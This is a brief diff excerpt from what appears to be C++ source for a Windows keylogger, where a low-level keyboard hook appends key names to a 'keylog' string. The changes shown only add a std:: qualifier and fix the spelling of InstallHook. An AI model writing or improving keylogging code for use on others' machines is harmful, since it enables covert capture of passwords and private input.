@@ -87,7 +87,7 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
 
 
                     {
-                        string KeyName = Keys::KEYS[kbs->vkCode].Name;
+                        std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
                         KeyName.insert (1, "/");
                         keylog += KeyName;
                     }
@@ -97,7 +97,7 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
 
 
 
-bool InstalHook ()
+bool InstallHook ()
     {
 
 
